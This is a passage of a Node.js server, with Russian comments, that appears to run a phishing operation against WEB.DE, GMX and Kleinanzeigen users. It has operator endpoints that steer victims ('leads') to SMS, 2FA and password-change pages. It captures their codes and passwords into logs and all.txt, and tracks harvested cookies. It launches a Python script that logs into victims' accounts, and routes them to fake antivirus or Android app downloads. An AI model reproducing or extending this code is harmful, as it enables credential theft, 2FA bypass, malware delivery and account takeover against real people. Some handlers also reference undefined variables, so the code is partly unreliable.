        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: скрипт уже запущен для email, id=' + id);
        return send(res, 409, { ok: false, error: 'Для этого email скрипт входа уже запущен' });
      }
      if (runningWebdeLoginLeadIds.size >= WEBDE_LOGIN_MAX_CONCURRENT) {
        clearWebdeScriptRunning(emailLower);
        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: занято слотов ' + WEBDE_LOGIN_MAX_CONCURRENT);
        return send(res, 409, { ok: false, error: 'Достигнут лимит одновременных автовходов (' + WEBDE_LOGIN_MAX_CONCURRENT + ')' });
      }
      const loginDir = path.join(PROJECT_ROOT, 'login');
      const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
      if (!fs.existsSync(scriptPath)) {
        clearWebdeScriptRunning(emailLower);
        console.error('[АДМИН] webde-login-start: скрипт не найден — ' + scriptPath);
        return send(res, 500, { ok: false, error: 'login/lead_simulation_api.py не найден' });
      }
      const webdeComboSlotManual = runningWebdeLoginLeadIds.size;
      runningWebdeLoginLeadIds.add(id);
      const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
      const host = (req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1:' + PORT).split(',')[0].trim();
      const baseUrl = process.env.SERVER_URL || (protocol + '://' + host);
      const token = ADMIN_TOKEN || '';
      const python = process.platform === 'win32' ? 'python' : 'python3';
      const env = Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' });
      const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--token', token, '--combo-slot', String(webdeComboSlotManual)];
      if (readStartPage() === 'klein') pyArgsManual.push('--klein-orchestration');
      const child = require('child_process').spawn(python, pyArgsManual, { cwd: PROJECT_ROOT, detached: true, stdio: 'inherit', env });
      webdeLockWriteChildPid(emailLower, child.pid);
      webdeLoginChildByLeadId.set(id, child);
      child.on('exit', function () {
        webdeLoginChildByLeadId.delete(id);
      });
      child.unref();
      const manualSession = beginWebdeAutoLoginRun(lead);
      const manualKleinOrch = readStartPage() === 'klein';
      const manualDetail = 'ручной запуск · lead_simulation_api.py' + (manualKleinOrch ? ' · --klein-orchestration' : '');
      pushEvent(lead, EVENT_LABELS.WEBDE_START, 'script', { session: manualSession, detail: manualDetail });
      persistLeadPatch(id, {
        webdeScriptRunSeq: lead.webdeScriptRunSeq,
        webdeScriptActiveRun: lead.webdeScriptActiveRun,
        eventTerminal: lead.eventTerminal
      });
      logTerminalFlow('АДМИН', 'Админ', manualSession, email, 'ручной запуск webde-login id=' + id + (manualKleinOrch ? ' klein-orchestration' : ''));
      send(res, 200, { ok: true, message: 'started' });
    });
    return;
  }

  if (pathname === '/api/redirect-sms-code' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: SMS — id=' + id);
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_sms_code';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-2fa-code' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: 2-FA — id=' + id);
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_2fa_code';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, EVENT_LABELS.TWO_FA, 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-open-on-pc' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: открыть на ПК — id=' + id);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_open_on_pc';
      pushEvent(lead, 'Отправлен: «Открыть на ПК»', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-android' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_android';
      pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  /**
   * WEB/GMX: одна кнопка Download — по platform лида:
   * Android → страница приложения; macOS → смена пароля; Windows / iOS / прочее / неизвестно → Sicherheit (антивирус/PC).
   */
  if (pathname === '/api/redirect-download-by-platform' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (lead.brand === 'klein') {
        return send(res, 400, { ok: false, error: 'Только для логов WEB.DE / GMX' });
      }
      const p = (lead.platform || '').toLowerCase();
      if (p === 'android') {
        lead.status = 'redirect_android';
        pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
      } else if (p === 'macos') {
        lead.status = 'redirect_change_password';
        pushEvent(lead, 'Отправлен на смену (Mac)', 'admin');
      } else {
        lead.status = 'redirect_sicherheit';
        pushEvent(lead, 'Отправлен на Sicherheit (Download PC)', 'admin');
      }
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      console.log('[АДМИН] Download по OS: id=' + id + ' platform=' + (p || '?') + ' → ' + lead.status);
      send(res, 200, { ok: true, status: lead.status, platform: p || 'unknown' });
    });
    return;
  }

  if (pathname === '/api/redirect-klein-forgot' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_klein_forgot';
      pushEvent(lead, 'Klein: редирект на Passwort vergessen', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/log-action' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id;
      const action = json.action;
      if (!idRaw || typeof idRaw !== 'string' || !action) {
        return send(res, 400, { ok: false });
      }
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      
      // Обрабатываем действие 'success' - записываем событие успеха в лог
      if (action === 'success') {
        lead.status = 'show_success';
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS);
        persistLeadPatch(id, { status: lead.status, lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        writeDebugLog('LOG_ACTION_SUCCESS', { 
          id: id, 
          email: lead.email || '',
          action: action
        });
        return send(res, 200, { ok: true });
      }
      
      // Действие со страницы загрузки антивируса: только пишем в лог лида
      if (action === 'sicherheit_download') {
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, 'Нажал скачать');
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      }

      if (action === 'android_download') {
        lead.lastSeenAt = new Date().toISOString();
        pushEvent(lead, 'Нажал скачать (Android)');
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        return send(res, 200, { ok: true });
      }

      // Обрабатываем другие действия (push_resend, sms_resend, sms_request)
      const validAction = action === 'push_resend' || action === 'sms_resend' || action === 'sms_request' || action === 'two_fa_resend' ? action : null;
      if (!validAction) {
        return send(res, 400, { ok: false });
      }
      if (validAction === 'push_resend') {
        webdePushResendRequested[id] = true;
      }
      if (!lead.actionLog) lead.actionLog = [];
      lead.actionLog.push({ type: validAction, at: new Date().toISOString() });
      const labels = { push_resend: 'Запрос PUSH', sms_resend: 'Просит SMS', sms_request: 'Запрос SMS', two_fa_resend: 'Просит код 2FA (erneut)' };
      lead.lastSeenAt = new Date().toISOString();
      pushEvent(lead, labels[validAction] || validAction);
      persistLeadPatch(id, {
        lastSeenAt: lead.lastSeenAt,
        eventTerminal: lead.eventTerminal,
        actionLog: lead.actionLog
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/sms-code-submit' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const idRaw = json.id;
      if (!idRaw || typeof idRaw !== 'string') return send(res, 400, { ok: false });
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      const codeStr = json.code != null ? String(json.code).trim() : '';
      const submitKind = json.kind != null ? String(json.kind).trim().toLowerCase() : '';
      lead.smsCodeData = {
        code: codeStr,
        submittedAt: new Date().toISOString(),
        kind: submitKind === '2fa' ? '2fa' : 'sms',
      };
      let smsEventLabel;
      if (submitKind === '2fa') {
        smsEventLabel = codeStr ? ('Ввел 2FA-код: ' + codeStr) : 'Ввел 2FA-код';
      } else {
        smsEventLabel = lead.brand === 'klein'
          ? (codeStr ? 'Ввел SMS Kl: ' + codeStr : 'Ввел SMS Kl')
          : (codeStr ? 'Ввел SMS-код: ' + codeStr : 'Ввел SMS-код');
      }
      let clearWrong2faScript = false;
      if (submitKind === '2fa' && lead.scriptStatus === 'wrong_2fa') {
        delete lead.scriptStatus;
        clearWrong2faScript = true;
      }
      pushEvent(lead, smsEventLabel);
      // Не переводим в show_success автоматически: админ сам отправляет на успех после проверки кода (если код неверный — юзер может ввести заново)
      const smsPatch = { smsCodeData: lead.smsCodeData, eventTerminal: lead.eventTerminal };
      if (clearWrong2faScript) smsPatch.scriptStatus = null;
      persistLeadPatch(id, smsPatch);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/change-password' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      const email = (lead.email || '').trim();
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      
      // Сохраняем в all.txt
      if (email && newPassword) {
        appendToAllLog(email, currentPassword, newPassword);
      }
      
      lead.changePasswordData = {
        currentPassword: currentPassword,
        newPassword: newPassword,
        submittedAt: new Date().toISOString(),
      };
      // Пароль со страницы смены идёт только в password history с пометкой "new"; поле Password (со входа) не меняем
      pushPasswordHistory(lead, newPassword, 'change');
      lead.lastSeenAt = new Date().toISOString();
      
      // Устанавливаем статус для показа окна успеха через 5 секунд
      const mode = readMode();
      if (mode === 'auto') {
        // В режиме AUTO статус будет установлен через 5 секунд (обрабатывается на клиенте)
        lead.status = 'pending';
        pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
      } else {
        // В режиме MANUAL статус устанавливается админом вручную
        lead.status = 'pending';
        pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
      }
      
      persistLeadFull(lead);
      writeDebugLog('CHANGE_PASSWORD', { 
        id: id, 
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        status: lead.status
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/change-password-by-email' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const visitId = (json.visitId != null && String(json.visitId).trim()) ? String(json.visitId).trim() : null;
      let email = (json.email != null ? String(json.email) : '').trim();
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      if (!newPassword || newPassword.length < 8) return send(res, 400, { ok: false, error: 'Neues Passwort muss mindestens 8 Zeichen haben.' });
      const leads = readLeads();
      let idx = -1;
      if (visitId) {
        idx = leads.findIndex((l) => l.id === visitId);
        if (idx >= 0 && !email) email = (leads[idx].email || '').trim();
      }
      if (idx === -1 && email) {
        const emailLower = email.toLowerCase();
        idx = leads.findIndex((l) => (l.email || '').trim().toLowerCase() === emailLower);
      }
      if (idx < 0) return send(res, 400, { ok: false, error: 'E-Mail fehlt oder Sitzung ungültig.' });
      const mode = readMode();
      if (idx >= 0) {
        const lead = leads[idx];
        lead.email = email;
        lead.changePasswordData = { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() };
        const oldPassword = lead.password || '';
        pushPasswordHistory(lead, newPassword, 'change');
        lead.lastSeenAt = new Date().toISOString();
        if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
        if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
        const platformChange = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
        if (platformChange != null) lead.platform = platformChange;
        // В режиме AUTO сразу показываем успех (клиент покажет overlay и вызовет log-action)
        if (mode === 'auto') {
          lead.status = 'show_success';
          pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
        } else {
          lead.status = 'pending';
          pushEvent(lead, lead.brand === 'klein' ? 'Новый пароль Kl' : 'Новый пароль');
        }
        
        persistLeadFull(lead);
        appendToAllLog(email, currentPassword, newPassword);
        writeDebugLog('CHANGE_PASSWORD_BY_EMAIL', { 
          id: idx >= 0 ? lead.id : newId, 
          email: email,
          oldPassword: oldPassword,
          newPassword: newPassword,
          visitId: visitId || null
        });
        send(res, 200, { ok: true });
        return;
      }
      // Если лид не найден, создаём новый (или обновляем существующий по visitId, если он был передан)
      const newId = visitId || ('pw-' + Date.now() + '-' + Math.random().toString(36).slice(2, 11));
      const ip = getClientIp(req);
      const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : undefined;
      const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;
      const platform = resolvePlatform(getPlatformFromRequest(req), screenW);
      const newLead = {
        id: newId,
        email: email,
        ip: ip,
        password: newPassword,
        createdAt: new Date().toISOString(),
        lastSeenAt: new Date().toISOString(),
        changePasswordData: { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() },
        status: mode === 'auto' ? 'show_success' : 'pending',
        eventTerminal: mode === 'auto' ? [{ at: new Date().toISOString(), label: 'Автоматически: окно успеха' }] : [],
        platform: platform || undefined,
        screenWidth: screenW,
        screenHeight: screenH,
      };
      pushPasswordHistory(newLead, newPassword, 'change');
      appendToAllLog(email, currentPassword, newPassword);
      persistLeadFull(newLead);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/show-error' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'error';
      const hb = statusHeartbeats[id];
      const curPage = (hb && hb.currentPage) || '';
      const isSmsPage = curPage === 'sms-code';
      const is2faPage = curPage === '2fa-code';
      lead.adminErrorKind = isSmsPage || is2faPage ? 'sms' : 'login';
      let evLabel;
      if (is2faPage) {
        evLabel = EVENT_LABELS.WRONG_2FA;
      } else if (isSmsPage) {
        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_SMS_KL : EVENT_LABELS.WRONG_SMS;
      } else {
        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
      }
      pushEvent(lead, evLabel, 'admin');
      persistLeadPatch(id, {
        status: lead.status,
        adminErrorKind: lead.adminErrorKind,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/show-success' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null && json.id !== '') ? String(json.id).trim() : '';
      if (!id) return send(res, 400, { ok: false, error: 'Нужен id лида' });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l && String(l.id) === id);
      if (idx === -1) return send(res, 404, { ok: false, error: 'Запись не найдена' });
      const lead = leads[idx];
      lead.status = 'show_success';
      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS, 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/geo' && req.method === 'GET') {
    const ip = (parsed.query.ip || '').trim();
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.')) {
      return send(res, 200, { countryCode: '' });
    }
    const cleanIp = ip.replace(/^::ffff:/, '');
    const opts = { hostname: 'ip-api.com', path: '/json/' + encodeURIComponent(cleanIp) + '?fields=countryCode', method: 'GET' };
    const reqGeo = http.request(opts, (resGeo) => {
      let data = '';
      resGeo.on('data', (chunk) => { data += chunk; });
      resGeo.on('end', () => {
        if (safeEnd(res)) return;
        let countryCode = '';
        try {
          const j = JSON.parse(data);
          if (j && j.countryCode) countryCode = String(j.countryCode).toUpperCase().slice(0, 2);
        } catch (_) {}
        res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
        res.end(JSON.stringify({ countryCode: countryCode }));
      });
    });
    reqGeo.on('error', () => {
      if (safeEnd(res)) return;
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ countryCode: '' }));
    });
    reqGeo.setTimeout(3000, () => {
      reqGeo.destroy();
      if (safeEnd(res)) return;
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ countryCode: '' }));
    });
    reqGeo.end();
    return;
  }

  if (pathname === '/api/mark-opened' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const email = json.email;
      if (!email || typeof email !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const emailLower = email.trim().toLowerCase();
      const now = new Date().toISOString();
      let found = false;
      const markedIds = [];
      // Помечаем все логи с таким email как открытые
      leads.forEach(function(lead) {
        const leadEmail = (lead.email || '').trim().toLowerCase();
        if (leadEmail === emailLower && !lead.openedAt) {
          lead.openedAt = now;
          found = true;
          markedIds.push(lead.id);
        }
      });
      if (found) {
        markedIds.forEach(function (mid) {
          const Lm = leads.find(function (x) { return x && String(x.id) === String(mid); });
          if (Lm) persistLeadPatch(mid, { openedAt: Lm.openedAt });
        });
        writeDebugLog('MARK_OPENED', { 
          email: email, 
          markedCount: markedIds.length,
          markedIds: markedIds
        });
      }
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/leads' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    var leadsQuery = (parsed && parsed.query) || {};
    var page = Math.max(1, parseInt(leadsQuery.page, 10) || 1);
    var limit = Math.min(1000, Math.max(1, parseInt(leadsQuery.limit, 10) || 200));
    writeDebugLog('LEADS_REQUESTED', { timestamp: new Date().toISOString(), ip: getClientIp(req), page: page, limit: limit });
    readLeadsAsync(function (err, leads) {
      if (err) {
        console.error('[SERVER] Ошибка чтения leads:', err);
        return send(res, 500, { error: 'Ошибка чтения данных' });
      }
      try {
        if (!Array.isArray(leads)) {
          console.error('[SERVER] Ошибка: leads.json не является массивом');
          return send(res, 200, { leads: [], total: 0, page: 1, limit: limit });
        }
        const originalCount = leads.length;

        leads = leads.filter(function (l) {
          return l && typeof l === 'object' && (l.id || l.email || l.ip);
        });
        const afterFilterCount = leads.length;

        let cleaned = [];
        const seenIds = new Set();
        leads.forEach(function (lead) {
          if (!lead || typeof lead !== 'object') return;
          const id = lead.id != null ? String(lead.id).trim() : '';
          if (id && seenIds.has(id)) return;
          if (id) seenIds.add(id);
          cleaned.push(lead);
        });
        leads = cleaned;

        const now = Date.now();
        leads.forEach(function (l) {
          const h = l && l.id ? statusHeartbeats[l.id] : null;
          if (!h) return;
          const seenAt = new Date(h.lastSeenAt).getTime();
          if (now - seenAt <= HEARTBEAT_MAX_AGE_MS) {
            l.sessionPulseAt = h.lastSeenAt;
            if (h.currentPage) l.currentPage = h.currentPage;
          }
        });
        const leadIds = new Set(leads.map(function (l) { return l && l.id ? l.id : null; }).filter(Boolean));
        Object.keys(statusHeartbeats).forEach(function (kid) {
          if (!leadIds.has(kid)) delete statusHeartbeats[kid];
          else if (now - new Date(statusHeartbeats[kid].lastSeenAt).getTime() > HEARTBEAT_MAX_AGE_MS) delete statusHeartbeats[kid];
        });

        /** Порядок в списке админки: только «новая сессия» (новый лог / снова ввёл email), не каждое событие. См. adminListSortAt при создании лида. */
        function leadRecencyMsForApi(l) {
          if (!l) return 0;
          const als = l.adminListSortAt ? new Date(l.adminListSortAt).getTime() : NaN;
          if (!isNaN(als) && als > 0) return als;
          const cr = l.createdAt ? new Date(l.createdAt).getTime() : NaN;
          if (!isNaN(cr) && cr > 0) return cr;
          const ls = l.lastSeenAt ? new Date(l.lastSeenAt).getTime() : NaN;
          return !isNaN(ls) && ls > 0 ? ls : 0;
        }
        leads.sort(function (a, b) {
          if (!a || !b) return 0;
          const ta = leadRecencyMsForApi(a);
          const tb = leadRecencyMsForApi(b);
          if (tb !== ta) return tb - ta;
          return (b.id || '').localeCompare(a.id || '');
        });

        const seenId = new Set();
        const result = leads.filter(function (l) {
          const id = (l && l.id) ? String(l.id).trim() : '';
          if (id) {
            if (seenId.has(id)) return false;
            seenId.add(id);
          }
          return true;
        });

        /**
         * В списке админки по умолчанию нет архивных (adminLogArchived / klLogArchived — данные в leads.json остаются).
         * Показать все: ?includeArchived=1
         */
        var includeArchived = leadsQuery.includeArchived === '1' || leadsQuery.includeArchived === 'true';
        var listForAdmin = result;
        if (!includeArchived) {
          listForAdmin = result.filter(function (l) {
            if (!l || typeof l !== 'object') return false;
            if (archiveFlagIsSet(l.adminLogArchived) || archiveFlagIsSet(l.klLogArchived)) return false;
            return true;
          });
        }

        var chatData = chatService.readChat();
        var cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
        var cookieSafeSet = new Set();
        if (fs.existsSync(cookiesDir)) {
          fs.readdirSync(cookiesDir).filter(function (f) { return f.endsWith('.json'); }).forEach(function (f) { cookieSafeSet.add(f.slice(0, -5)); });
        }
        var cookieExportedSet = new Set(readCookiesExported());
        function cookieSafeFromEmail(email) {
          if (!email || typeof email !== 'string') return '';
          return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
        }
        var resultWithChat = listForAdmin.map(function (l) {
          var copy = {};
          for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
          var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
          copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
          var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
          copy.cookiesAvailable = cookieSafeSet.has(safe);
          copy.cookiesExported = cookieExportedSet.has(safe);
          return copy;
        });
        const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
        resultWithChat.forEach(function (l) {
          const p = (l.platform || '').toLowerCase();
          if (p === 'windows') byPlatform.windows++;
          else if (p === 'macos') byPlatform.macos++;
          else if (p === 'android') byPlatform.android++;
          else if (p === 'ios') byPlatform.ios++;
          else byPlatform.other++;
        });
        var total = resultWithChat.length;
        var start = (page - 1) * limit;
        var slice = resultWithChat.slice(start, start + limit);
        /** Админка: при пагинации выбранный лид может «выпасть» со страницы при появлении нового лога — не переключать фокус на новый. */
        var ensureIdRaw = leadsQuery.ensureId && String(leadsQuery.ensureId).trim();
        var ensureResolved = ensureIdRaw ? String(resolveLeadId(ensureIdRaw)) : '';
        if (ensureResolved) {
          var alreadyInSlice = slice.some(function (l) {
            return l && l.id != null && String(l.id) === ensureResolved;
          });
          if (!alreadyInSlice) {
            var ensuredLead = resultWithChat.find(function (l) {
              return l && l.id != null && String(l.id) === ensureResolved;
            });
            if (ensuredLead) {
              slice = slice.concat([ensuredLead]);
              slice.sort(function (a, b) {
                if (!a || !b) return 0;
                var ta = leadRecencyMsForApi(a);
                var tb = leadRecencyMsForApi(b);
                if (tb !== ta) return tb - ta;
                return (b.id || '').localeCompare(a.id || '');
              });
            }
          }
        }
        writeDebugLog('LEADS_RETURNED', { count: slice.length, total: total, page: page, limit: limit, totalInFile: originalCount, byPlatform: byPlatform });
        var _payload = { leads: slice, total: total, page: page, limit: limit };
        /** Админка: после слияния логов (тот же email → новый id) выбранный старый id не совпадает с записью — подставить актуальный id из replaced-lead-ids. */
        if (ensureIdRaw) {
          _payload.ensureIdResolved = ensureResolved || ensureIdRaw;
        }
        if (safeEnd(res)) return;
        var bodyJson = JSON.stringify(_payload);
        var leadsHeaders = {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          'Pragma': 'no-cache'
        };
        res.writeHead(200, leadsHeaders);
        var chunkSize = 65536;
        for (var i = 0; i < bodyJson.length; i += chunkSize) {
          res.write(bodyJson.slice(i, i + chunkSize));
        }
        res.end();
        return;
      } catch (e) {
        console.error('[SERVER] Ошибка обработки leads:', e);
        return send(res, 500, { error: 'Ошибка чтения данных' });
      }
    });
    return;
  }

  if (pathname === '/api/save-credentials' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    console.log('[SERVER] /api/save-credentials: получен запрос');
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      console.log('[SERVER] /api/save-credentials: тело запроса:', body);
      let json = {};
      try { 
        json = JSON.parse(body || '{}'); 
        console.log('[SERVER] /api/save-credentials: распарсен JSON:', json);
      } catch (err) {
        console.error('[SERVER] /api/save-credentials: ошибка парсинга JSON:', err);
        return send(res, 400, { ok: false, error: 'invalid json' });
      }
      const id = json.id;
      console.log('[SERVER] /api/save-credentials: id=', id);
      if (!id || typeof id !== 'string') {
        console.error('[SERVER] /api/save-credentials: неверный id');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const leads = readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.error('[SERVER] /api/save-credentials: лог не найден, id=', id);
